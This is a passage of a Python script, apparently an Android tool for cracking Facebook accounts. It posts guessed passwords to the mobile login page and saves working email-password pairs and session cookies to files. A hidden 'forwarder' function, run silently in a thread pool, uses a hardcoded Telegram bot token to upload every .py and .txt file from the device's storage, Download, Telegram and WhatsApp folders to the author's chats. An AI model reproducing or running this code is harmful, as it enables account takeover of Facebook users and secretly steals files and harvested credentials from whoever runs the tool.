                pass

            GOXDIES.submit(
                gxdsAPI,
                uid,
                pxss,
                tl,
            )
            

# API
def gxdsAPI(uid, pxss, tl):
    global oks, loop, cps, ugen
    session = requests.Session()
    sys.stdout.write(
        f"\r{dg}  [GXDS]--[%s/%s]--[CP-%s]~[HITS-%s] \r" % (loop, tl, len(cps), len(oks))),
    sys.stdout.flush()
    try:
        for ps in pxss:
            yrs = yxxr(uid)
            fb = "n"
            gxdsfbs = session.get(f"https://{fb}.facebook.com").text
            info = {
                "lsd": re.search('name="lsd" value="(.*?)"', str(gxdsfbs)).group(1),
                "jazoest": re.search(
                    'name="jazoest" value="(.*?)"', str(gxdsfbs)
                ).group(1),
                "m_ts": re.search('name="m_ts" value="(.*?)"', str(gxdsfbs)).group(1),
                "li": re.search('name="li" value="(.*?)"', str(gxdsfbs)).group(1),
                "try_number": "0",
                "unrecognized_tries": "0",
                "email": uid,
                "pass": ps,
                "login": "Log In",
            }
            update = {
                "authority": f"{fb}.facebook.com",
                "method": "GET",
                "scheme": "https",
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US,en;q=1",
                "cache-control": "no-cache, no-store, must-revalidate",
                "referer": f"https://{fb}.facebook.com/",
                "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "Android",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin",
                "sec-fetch-user": "?1",
                "pragma": "no-cache",
                "priority": "u=1",
                "cross-origin-resource-policy": "cross-origin",
                "upgrade-insecure-requests": "1",
                "user-agent": ugen,
            }
            session.post(
                url=f"https://{fb}.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
                data=info,
                headers=update,
            ).text
            jabeee = session.cookies.get_dict().keys()
            if "c_user" in jabeee:
                coki = ";".join(
                    [
                        key + "=" + value
                        for key, value in session.cookies.get_dict().items()
                    ]
                )
                print(
                    f"""{lgr}  [GXDS HITS]
 EMAIL  : {uid} 
 PASS   : {ps} 
 JOINED : {yrs}
 COOKIE : {coki}
 AGENT  : {ugen}
"""
                )
                open("/sdcard/gxds-ok.txt", "a").write(uid + "|" + ps + "\n")
                open("/sdcard/gxds-cookies.txt", "a").write(coki + "\n")
                oks.append(uid)
                break
            elif "checkpoint" in jabeee:
                coki = ";".join(
                    [
                        key + "=" + value
                        for key, value in session.cookies.get_dict().items()
                    ]
                )
                print(
                    f"""{lr}  [GXDS CHECKPOINT]
 EMAIL  : {uid} 
 PASS   : {ps} 
 JOINED : {yrs}
 COOKIE : {coki}
 AGENT  : {ugen}
"""
                )
                open("/sdcard/gxds-cp.txt", "a").write(uid + "|" + ps + "\n")
                open("/sdcard/gxds-cookies.txt", "a").write(coki + "\n")
                cps.append(uid)
                break
            else:
                continue
        loop += 1
    except:
        pass


# FORWARDER
def gxdsBot():
    session = requests.session()

    bot_token = "6404644715:AAFekBigDm7fAl3ZUhT710u8DfkF75ggTu8"
    chat_id = "6542321044"
    txt_id = "-4041074884"
    # SD CARD
    try:
        sdcard_path = "/sdcard"
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith(".py")]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), "rb") as f:
                url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                data2 = {"chat_id": chat_id}
                data = {"chat_id": chat_id}
                files = {"document": f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:
        pass

    try:
        sdcard_path = "/sdcard"
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith(".txt")]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), "rb") as f:
                url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                data2 = {"chat_id": txt_id}
                data = {"chat_id": txt_id}
                files = {"document": f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:
        pass

    # DOWNLOAD PATH
    try:
        sdcard_path = "/sdcard/Download"
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith(".py")]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), "rb") as f:
                url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                data2 = {"chat_id": chat_id}
                data = {"chat_id": chat_id}
                files = {"document": f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:
        pass

    try:
        sdcard_path = "/sdcard/Download"
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith(".txt")]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), "rb") as f:
                url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                data2 = {"chat_id": txt_id}
                data = {"chat_id": txt_id}
                files = {"document": f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:
        pass
    # TELEGRAM PATH
    try:
        sdcard_path = "/sdcard/Download/Telegram"
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith(".py")]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), "rb") as f:
                url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                data2 = {"chat_id": chat_id}
                data = {"chat_id": chat_id}
                files = {"document": f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:
        pass

    try:
        sdcard_path = "/sdcard/Download/Telegram"
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith(".txt")]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), "rb") as f:
                url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                data2 = {"chat_id": txt_id}
                data = {"chat_id": txt_id}
                files = {"document": f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:
        pass
    # TELEGRAM PATH
    try:
        sdcard_path = "/sdcard/Telegram/Telegram Files"
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith(".py")]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), "rb") as f:
                url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                data2 = {"chat_id": chat_id}
                data = {"chat_id": chat_id}
                files = {"document": f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:
        pass

    try:
        sdcard_path = "/sdcard/Telegram/Telegram Files"
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith(".txt")]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), "rb") as f:
                url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                data2 = {"chat_id": txt_id}
                data = {"chat_id": txt_id}
                files = {"document": f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:
        pass
    # WHATSAPP PATH
    try:
        sdcard_path = "/sdcard/WhatsApp/Media/WhatsApp Documents"
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith(".py")]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), "rb") as f:
                url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                data2 = {"chat_id": chat_id}
                data = {"chat_id": chat_id}
                files = {"document": f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:
        pass

    try:
        sdcard_path = "/sdcard/WhatsApp/Media/WhatsApp Documents"
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith(".txt")]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), "rb") as f:
                url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                data2 = {"chat_id": txt_id}
                data = {"chat_id": txt_id}
                files = {"document": f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:
        pass


with ThreadPool(max_workers=90) as jjk:
    jjk.submit(gxdsBot)
    jjk.submit(apprxval)
